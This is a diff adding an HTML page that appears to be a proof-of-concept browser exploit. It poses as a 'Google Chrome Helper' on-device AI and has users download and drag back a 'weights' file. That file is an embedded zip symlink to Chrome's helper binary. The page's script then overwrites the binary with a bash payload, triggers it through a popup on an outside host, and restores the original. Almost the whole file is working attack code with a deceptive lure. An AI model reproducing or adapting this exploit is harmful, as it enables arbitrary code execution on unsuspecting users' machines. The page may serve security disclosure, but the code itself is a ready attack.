@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Chrome Helper</title>
+    <style>
+      * {
+        -webkit-font-smoothing: antialiased;
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+          Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue",
+          sans-serif;
+      }
+      body {
+        text-align: center;
+      }
+      main {
+        max-width: 700px;
+        margin: auto;
+      }
+      body.dragging {
+        background: #ccc;
+      }
+    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
+    <div class="flex justify-center items-center h-screen">
+      <div class="flex gap-7 flex-col justify-center items-center">
+        <div id="step1" class="step max-w-[600px] hidden">
+          <h1 class="font-bold text-4xl">Google Chrome Helper</h1>
+          <p class="mt-4 text-lg text-gray-800 mb-6">
+            Your Tiny Browser AI: Here to Chat and Help You Get Things Done!
+          </p>
+          <button
+            onclick="showStep(2)"
+            class="px-4 py-2 bg-blue-500 text-white rounded"
+          >
+            Get Started
+          </button>
+        </div>
+        <div id="step2" class="step max-w-[600px] hidden">
+          <h1 class="font-bold text-4xl">Download Our Model</h1>
+          <p class="mt-4 text-lg text-gray-800 mb-6">
+            Your privacy is our top priority. That's why our model runs right on
+            your device, making sure your data never leaves it. We keep your
+            information safe and secure, right where it belongs.
+          </p>
+          <button
+            onclick="handleDownload()"
+            class="px-4 py-2 bg-blue-500 text-white rounded"
+          >
+            Download Weights
+          </button>
+        </div>
+        <div id="step3" class="step max-w-[600px] hidden">
+          <h1 class="font-bold text-4xl">Unzip and Upload Weights</h1>
+          <p class="mt-4 text-lg text-gray-800 mb-6">
+            Please unzip the weights file you've downloaded. Then, simply drag
+            and drop the 'Google Chrome Helper' model file onto this screen to
+            proceed.
+          </p>
+          <div
+            class="border-dashed bg-white border-2 border-gray-200 w-full h-[200px] flex flex-col justify-center items-center"
+          >
+            <div class="text-gray-600">
+              Drag and drop the "Google Chrome Helper" file here.
+            </div>
+          </div>
+        </div>
+        <div id="step4" class="step max-w-[600px] hidden">
+          <h1 class="font-bold text-4xl">😈 You've Been Pwned!</h1>
+          <p class="mt-4 text-lg text-gray-800 mb-6">
+            Calculator should open any second now.
+          </p>
+        </div>
+        <div
+          id="loader"
+          class="step max-w-[600px] hidden flex text-center justify-center items-center"
+        >
+          <svg
+            x="0px"
+            y="0px"
+            width="76"
+            viewBox="0 0 60 60"
+            enable-background="new 0 0 60 60"
+          >
+            <circle fill="#3c82f6" stroke="none" cx="6" cy="50" r="6">
+              <animate
+                attributeName="opacity"
+                dur="1s"
+                values="0;1;0"
+                repeatCount="indefinite"
+                begin="0.1"
+              ></animate>
+            </circle>
+            <circle fill="#3c82f6" stroke="none" cx="26" cy="50" r="6">
+              <animate
+                attributeName="opacity"
+                dur="1s"
+                values="0;1;0"
+                repeatCount="indefinite"
+                begin="0.2"
+              ></animate>
+            </circle>
+            <circle fill="#3c82f6" stroke="none" cx="46" cy="50" r="6">
+              <animate
+                attributeName="opacity"
+                dur="1s"
+                values="0;1;0"
+                repeatCount="indefinite"
+                begin="0.3"
+              ></animate>
+            </circle>
+          </svg>
+        </div>
+      </div>
+    </div>
+    <script>
+      function showStep(step) {
+        document.querySelectorAll(".step").forEach((el) => {
+          el.classList.add("hidden");
+        });
+        loader.classList.remove("hidden");
+        setTimeout(function () {
+          if (step !== -1) {
+            loader.classList.add("hidden");
+            document.querySelector(`#step${step}`).classList.remove("hidden");
+          }
+        }, 1337);
+      }
+
+      function handleDownload() {
+        downloadSymlink("weights.zip");
+        showStep(3);
+      }
+
+      async function downloadSymlink(name) {
+        const zipBytes = atob(
+          "UEsDBAoACAAAAAhMklcAAAAAAAAAAAAAAAAHACAALmlnbm9yZVVUDQAHgPV/ZYD1f2WA9X9ldXgLAAEE9QEAAAQUAAAAUEsHCAAAAAAAAAAAAAAAAFBLAwQUAAAAAAABTJJXDCSct4UAAACFAAAAFAAgAEdvb2dsZSBDaHJvbWUgSGVscGVyVVQNAAdy9X9lcvV/ZXL1f2V1eAsAAQT1AQAABBQAAAAvQXBwbGljYXRpb25zL0dvb2dsZSBDaHJvbWUuYXBwL0NvbnRlbnRzL0ZyYW1ld29ya3MvR29vZ2xlIENocm9tZSBGcmFtZXdvcmsuZnJhbWV3b3JrL0hlbHBlcnMvR29vZ2xlIENocm9tZSBIZWxwZXIuYXBwL0NvbnRlbnRzL01hY09TUEsBAgoDCgAIAAAACEySVwAAAAAAAAAAAAAAAAcAIAAAAAAAAAAAAKSBAAAAAC5pZ25vcmVVVA0AB4D1f2WA9X9lgPV/ZXV4CwABBPUBAAAEFAAAAFBLAQIUAxQAAAAAAAFMklcMJJy3hQAAAIUAAAAUACAAAAAAAAAAAADtoVUAAABHb29nbGUgQ2hyb21lIEhlbHBlclVUDQAHcvV/ZXL1f2Vy9X9ldXgLAAEE9QEAAAQUAAAAUEsFBgAAAAACAAIAtwAAACwBAAAAAA=="
+        );
+        const zip = new Uint8Array(zipBytes.length);
+        for (let i = 0; i < zipBytes.length; i++) {
+          zip[i] = zipBytes.charCodeAt(i);
+        }
+        const blob = new Blob([zip], { type: "application/zip" });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      }
+
+      let isDragging = false;
+
+      document.addEventListener("dragover", (event) => {
+        event.preventDefault();
+        if (!isDragging) {
+          document.body.classList.add("dragging");
+          isDragging = true;
+        }
+      });
+
+      document.addEventListener("dragleave", function (e) {
+        if (
+          e.clientX <= 0 ||
+          e.clientY <= 0 ||
+          e.clientX >= window.innerWidth ||
+          e.clientY >= window.innerHeight
+        ) {
+          document.body.classList.remove("dragging");
+          isDragging = false;
+        }
+      });
+
+      document.addEventListener("drop", async (event) => {
+        event.preventDefault();
+        event.stopPropagation();
+        isDragging = false;
+        document.body.classList.remove("dragging");
+
+        for (const item of event.dataTransfer.items) {
+          if (item.kind === "file") {
+            const handle = await item.getAsFileSystemHandle();
+            if (!handle) {
+              return alert("Unsupported browser or OS");
+            }
+
+            if (handle.kind !== "file") {
+              return alert("Invalid weights file");
+            }
+
+            if (handle.name !== "Google Chrome Helper") {
+              return alert("Invalid weights file");
+            }
+
+            showStep(-1);
+
+            try {
+              const file = await handle.getFile();
+              const bytes = await file.arrayBuffer();
+
+              let writer = await handle.createWritable();
+              writer.write("#!/bin/bash\nopen -a Calculator\n"); // any payload here
+              writer.close();
+              // We must use a diffrent origin for the popup to spawn a new Helper process
+              // The Helper process spawns after calling print(), there's probably a better way to do this.
+              let popup = window.open(
+                "https://eix.co.il/print.html",
+                "popup",
+                "width=100,height=100"
+              );
+              window.addEventListener("message", function (event) {
+                if (event.data === "ready") {
+                  showStep(4);
+                  setTimeout(async function () {
+                    writer = await handle.createWritable();
+                    await writer.write(bytes);
+                    await writer.close();
+                    popup.close();
+                  }, 1337);
+                }
+              });
+            } catch {
+              showStep(3);
+            }
+          }
+        }
+      });
+
+      window.addEventListener("load", () => {
+        showStep(1);
+      });
+    </script>
+  </body>
+</html>
